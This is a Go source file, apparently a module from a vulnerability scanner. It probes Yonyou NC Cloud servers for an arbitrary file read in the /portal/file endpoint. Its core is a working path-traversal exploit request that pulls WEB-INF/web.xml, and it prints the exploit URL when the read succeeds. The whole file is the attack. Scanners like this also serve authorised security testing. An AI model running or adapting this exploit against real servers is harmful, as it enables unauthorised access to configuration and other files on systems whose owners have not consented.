package nc_cloud_portal_file

import (
	"github.com/gookit/color"
	"github.com/imroc/req/v3"
	"strings"
	"time"
)

var (
	client     = req.C().EnableForceHTTP1().SetTimeout(5 * time.Second)
	UA         = "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:95.0) Gecko/20100101 Firefox/95.0"
	Connection = "Keep-Alive"
)

func Run(url string) {
	vulnUrl := url + "/portal/file?cmd=getFileLocal&fileid=..%2F..%2F..%2F..%2Fwebapps/nc_web/WEB-INF/web.xml"
	resp, err := client.R().
		SetHeaders(map[string]string{
			"User-Agent": UA,
			"Connection": Connection,
		}).Get(vulnUrl)
	if err != nil {
		color.Red.Println("[-01] 用友NC Cloud portal/file接口存在任意文件读取漏洞不存在")
		return
	}

	if err != nil {
		color.Red.Println("[-01] 用友NC Cloud portal/file接口存在任意文件读取漏洞 不存在")
		return
	}
	body := resp.String()

	if resp.StatusCode == 200 && strings.Contains(body, "xml") {
		cheurl := url + "/portal/file?cmd=getFileLocal&fileid=..%2F..%2F..%2F..%2Fwebapps/nc_web/WEB-INF/web.xml"
		color.Green.Println("[+01] 用友NC Cloud portal/file接口存在任意文件读取漏洞存在 -> ", cheurl)
	} else {
		color.Red.Println("[-01] 用友NC Cloud portal/file接口存在任意文件读取漏洞 不存在")
	}
}
